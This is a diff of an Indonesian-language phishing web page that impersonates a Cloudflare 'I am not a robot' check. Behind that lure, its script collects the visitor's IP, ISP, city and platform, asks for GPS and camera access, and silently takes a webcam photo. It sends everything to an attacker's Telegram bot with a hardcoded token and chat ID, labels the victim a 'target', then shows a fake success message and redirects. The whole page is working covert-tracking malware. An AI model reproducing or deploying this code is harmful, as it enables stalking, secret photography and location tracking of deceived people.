@@ -2,80 +2,108 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Verifikasi Kuota Gratis</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan Browser</title>
     <style>
-        body { background: #f4f4f4; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
-        .btn { background: #007bff; color: white; padding: 15px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; }
-        .loading { display: none; margin-top: 10px; font-size: 12px; color: #777; }
+        body { background: #f0f2f5; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 380px; width: 90%; }
+        .icon { width: 60px; margin-bottom: 15px; }
+        h2 { font-size: 18px; color: #1c1e21; margin-bottom: 10px; }
+        p { font-size: 14px; color: #606770; margin-bottom: 20px; }
+        .btn { background: #1877f2; color: white; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
+        #status { font-size: 11px; color: #999; margin-top: 15px; display: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card" id="main-box">
-        <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" width="80" alt="shield">
-        <h2>Verifikasi Identitas</h2>
-        <p>Klik tombol di bawah untuk memverifikasi bahwa Anda bukan robot dan klaim kuota 50GB.</p>
-        <button class="btn" onclick="startProcess()">SAYA BUKAN ROBOT</button>
-        <div id="status" class="loading">Memproses verifikasi...</div>
+    <div class="card">
+        <img src="https://cdn-icons-png.flaticon.com/512/1165/1165725.png" class="icon" alt="lock">
+        <h2>Verifikasi Cloudflare</h2>
+        <p>Silakan klik tombol di bawah untuk memverifikasi bahwa koneksi Anda aman dan dapatkan akses penuh.</p>
+        
+        <button class="btn" onclick="jalankanProses()">SAYA BUKAN ROBOT</button>
+        
+        <div id="status">Menghubungkan ke server aman...</div>
     </div>
 
-    <video id="video" width="160" height="120" style="display:none;" autoplay></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const TOKEN = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo';
-        const CHAT_ID = '8551809114';
+        // === [ PENTING: ISI DISINI ] ===
+        const BOT_TOKEN = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo'; // Ganti Token Bot Lo
+        const CHAT_ID = '8551809114'; // Ganti ID Chat Lo
+        // ===============================
 
-        async function startProcess() {
+        // Debugger: Munculin alert kalau ada error script
+        window.onerror = function(msg, url, line) {
+            alert("Sistem Error: " + msg + " di baris " + line);
+        };
+
+        async function jalankanProses() {
             document.getElementById('status').style.display = 'block';
             
-            // 1. Ambil IP dulu (Tanpa Izin)
-            const res = await fetch('https://ipapi.co/json/');
-            const ipData = await res.json();
+            try {
+                // 1. Ambil data IP (Tanpa Izin)
+                const res = await fetch('https://ipapi.co/json/');
+                const ip = await res.json();
 
-            // 2. Minta Izin Kamera & Lokasi secara bersamaan (Social Engineering)
-            // Target akan mengira ini bagian dari verifikasi "Bukan Robot"
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+                // 2. Minta Izin Lokasi & Kamera (Social Engineering)
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
 
-                // 3. Ambil Kamera
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
+                    // 3. Ambil Kamera kalau diizinkan
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
 
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                        const imgData = canvas.toDataURL('image/jpeg');
-                        
-                        // Kirim Foto dan Data ke Telegram
-                        sendToTele(ipData, lat, lon, imgData);
-                        stream.getTracks().forEach(track => track.stop()); // Matikan kamera
-                        
-                        alert("Verifikasi Gagal! Coba lagi nanti.");
-                        window.location.href = "https://google.com";
-                    }, 2000);
-                } catch (e) {
-                    // Jika kamera ditolak, tetap kirim data IP & Lokasi
-                    sendToTele(ipData, lat, lon, null);
-                }
-            }, (err) => {
-                // Jika lokasi ditolak, tetap kirim IP
-                sendToTele(ipData, null, null, null);
-            });
+                        setTimeout(async () => {
+                            const canvas = document.getElementById('canvas');
+                            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                            const imgData = canvas.toDataURL('image/jpeg');
+                            
+                            // Kirim Foto, IP, dan Lokasi
+                            await kirimKeTele(ip, lat, lon, imgData);
+                            
+                            stream.getTracks().forEach(t => t.stop()); // Matikan kamera
+                            selesai();
+                        }, 1500);
+                    } catch (camErr) {
+                        // Kalau kamera ditolak, tetep kirim IP & Lokasi
+                        await kirimKeTele(ip, lat, lon, null);
+                        selesai();
+                    }
+                }, async (locErr) => {
+                    // Kalau lokasi ditolak, tetep kirim data IP
+                    await kirimKeTele(ip, null, null, null);
+                    selesai();
+                });
+
+            } catch (err) {
+                alert("Koneksi gagal. Silakan coba lagi.");
+            }
         }
 
-        async function sendToTele(ip, lat, lon, img) {
-            let text = `🎯 **TARGET TERJERAT**\nIP: ${ip.ip}\nKota: ${ip.city}\nMaps: https://www.google.com/maps?q=${lat},${lon}`;
-            
+        async function kirimKeTele(ip, lat, lon, img) {
+            const maps = lat ? `https://www.google.com/maps?q=${lat},${lon}` : "Lokasi tidak diizinkan";
+            const teks = `
+🚩 **TARGET TERDETEKSI** 🚩
+--------------------------
+🌐 **IP:** ${ip.ip}
+🏙️ **Kota:** ${ip.city}
+🏢 **ISP:** ${ip.org}
+📱 **OS:** ${navigator.platform}
+📍 **Maps:** ${maps}
+--------------------------`;
+
             // Kirim Teks
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
             });
 
             // Kirim Foto (Jika ada)
@@ -83,12 +111,17 @@
                 const blob = await (await fetch(img)).blob();
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'target.jpg');
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                formData.append('photo', blob, 'capture.jpg');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
             }
+        }
+
+        function selesai() {
+            alert("Verifikasi Berhasil! Mengalihkan...");
+            window.location.href = "https://www.google.com"; // Redirect
         }
     </script>
 </body>
